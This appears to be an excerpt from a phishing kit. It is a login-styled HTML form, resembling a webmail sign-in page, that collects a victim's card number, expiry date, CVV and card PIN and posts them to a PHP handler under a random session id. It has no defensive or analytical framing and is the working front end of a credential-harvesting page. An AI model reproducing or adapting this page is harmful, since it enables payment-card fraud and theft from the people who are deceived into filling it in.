...
<form action="session/mcard.php?id=<?php echo bin2hex(random_bytes(16)); ?>" method="post" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
...
<div id="mainLogonDiv" class="tnarrow">
	...
	<div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
		...
		<div class="signInInputLabel" id="userNameLabel" aria-hidden="false">Card Number :</div>
		<div><input id="crdnum" name="crdnum" class="signInInputText" type="tel" role="textbox" aria-labelledby="userNameLabel" placeholder="Card Number"></div>
		    
        <script>
                                          var element = document.getElementById('crdnum');
                                          var maskOptions = {
		...
		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Expiry Date :</div>
		<div><input id="expdate" onfocus="g_fFcs=0" name="expdate" value="" type="tel" class="signInInputText" aria-labelledby="passwordLabel" placeholder="Expiry Date"></div>
		<script>
                                          var element = document.getElementById('expdate');
                                          var maskOptions = {
                                              mask: '00/00'
                                          };
                                          var mask = IMask(element, maskOptions);
        ...
        <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Card Cvv :</div>
		<div><input id="crdcvv" onfocus="g_fFcs=0" name="crdcvv" value="" type="tel" maxlength="4" class="signInInputText" aria-labelledby="passwordLabel" placeholder="Card Cvv"></div>

		   <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Card Pin :</div>
		<div><input id="crdpin" onfocus="g_fFcs=0" name="crdpin" value="" maxlength="4" type="tel" class="signInInputText" aria-labelledby="passwordLabel" placeholder="Card Pin"></div>
